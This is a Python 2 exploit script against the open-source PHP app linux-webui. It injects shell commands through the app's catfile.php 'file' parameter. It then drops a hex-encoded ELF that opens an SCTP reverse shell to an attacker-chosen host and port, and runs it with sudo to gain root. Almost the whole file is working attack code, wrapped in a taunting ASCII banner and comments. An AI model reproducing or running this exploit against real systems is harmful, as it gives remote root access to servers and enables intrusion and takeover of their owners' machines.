#!/usr/bin/python2
# coding: utf-8
# Example of how not to code PHP... Not a serious exploit, just one for fun as
# an example of how fucking badly people screw up. Picked an app while githubbin'
# and heres the ruinage.
# Exploits trivial command injection, followed by abusing the lolsudo implemented.
# Seriously, this dudes programming licence needs to be revoked.
# BONUS: Includes SCTP Backconnect for Great Justice reasons :D
# Screenshot: http://i.imgur.com/0CWDs8m.png
# Twitter: @dailydavedavids
# Vulnerable App: https://github.com/virajchitnis/linux-webui/
# HACK THE PLANET
import requests
import socket
import struct
import sys

print """\x1b[1;36m
▄▄▌  ▪   ▐ ▄ ▪  ▐▄• ▄ ▄• ▄▌▪   ▄▄▄·▄▄▌ ▐ ▄▌ ▐ ▄     
██•  ██ •█▌▐███  █▌█▌▪█▪██▌██ ▐█ ▄███· █▌▐█•█▌▐█    
██▪  ▐█·▐█▐▐▌▐█· ·██· █▌▐█▌▐█· ██▀·██▪▐█▐▐▌▐█▐▐▌    
▐█▌▐▌▐█▌██▐█▌▐█▌▪▐█·█▌▐█▄█▌▐█▌▐█▪·•▐█▌██▐█▌██▐█▌    
.▀▀▀ ▀▀▀▀▀ █▪▀▀▀•▀▀ ▀▀ ▀▀▀ ▀▀▀.▀    ▀▀▀▀ ▀▪▀▀ █▪    
 ▄▄▄· ▄ •▄  ▄▄▄·     ▄▄▌        ▄▄▌   ▄▄▄· ▄ .▄ ▄▄▄·
▐█ ▀█ █▌▄▌▪▐█ ▀█     ██•  ▪     ██•  ▐█ ▄███▪▐█▐█ ▄█
▄█▀▀█ ▐▀▀▄·▄█▀▀█     ██▪   ▄█▀▄ ██▪   ██▀·██▀▐█ ██▀·
▐█ ▪▐▌▐█.█▌▐█ ▪▐▌    ▐█▌▐▌▐█▌.▐▌▐█▌▐▌▐█▪·•██▌▐▀▐█▪·•
 ▀  ▀ ·▀  ▀ ▀  ▀     .▀▀▀  ▀█▄▀▪.▀▀▀ .▀   ▀▀▀ ·.▀ 
 A fine example in exactly how not to do PHP...
       \x1b[34m-skyhighatrist\\0x27.me\x1b[0;m"""

def make_elf(cb_host, cb_port):
    # Reverse SCTP Payload. Because you know I am fabulous. <3
    # TTY in next version, I promise :D
    sc = "7f454c4602010100000000000000000002003e00010000007800400000000000"
    sc += "400000000000000000000000000000000000000040003800010000000000000"
    sc += "001000000050000000000000000000000000040000000000000004000000000"
    sc += "00f500000000000000f5000000000000000000200000000000e9080000002f6"
    sc += "2696e2f736800b929000000bf02000000be01000000ba8400000089c80f0589"
    sc += "c766c74424f0020066c74424f20539c74424f4c0a80aaf488d7424f0b210b82"
    sc += "a0000000f05b22131f689d00f0540b60189d00f0540b60289d00f05488d3d9d"
    sc += "ffffff31f631d2b83b0000000f0531ffb83c0000000f05c3"
    sc = sc.replace("c0a80aaf", socket.inet_aton(cb_host).encode("hex"))
    sc = sc.replace("0539", struct.pack(">H", int(cb_port)).encode("hex"))
    return sc #.decode('hex') # as we now want it in hex form

def exec_cmd(target_url, cmd):
    injection_url = "%s/shellscripts/catfile.php?file=;%s" %(target_url, cmd)
    try:
        r = requests.get(url=injection_url, verify=False)
    except Exception, e:
        sys.exit(str(e))
    return r.text

def get_root(target_url, cb_host, cb_port):
    print "\x1b[1;32m{+} Generating SCTP Reverse Shell...\x1b[0m"
    print "\x1b[1;32m{+} Callback Address: %s%s:%s\x1b[0m" %("\x1b[1;31m", cb_host, cb_port)
    cback_elf = make_elf(cb_host=cb_host, cb_port=cb_port)
    print "\x1b[1;32m{+} Uploading our backdoor...\x1b[0m"
    cmd = """python -c 'f=open("/tmp/bl1ngbl1ng","wb").write("%s".decode("hex")).close()'""" %(cback_elf)
    exec_cmd(target_url=target_url, cmd=cmd)
    print "\x1b[1;31m{+} Shell comin'\x1b[0m"
    exec_cmd(target_url=target_url, cmd="chmod 777 /tmp/bl1ngbl1ng")
    exec_cmd(target_url=target_url, cmd="sudo /tmp/bl1ngbl1ng")

def main(args):
    if len(args) != 4:
        sys.exit("use: %s http://linux.ui hacke.rs 1337\nRemember: this baby uses a SCTP backconnect!" %(args[0]))
    get_root(target_url=args[1], cb_host=args[2], cb_port=args[3])

if __name__ == "__main__":
    main(args=sys.argv)
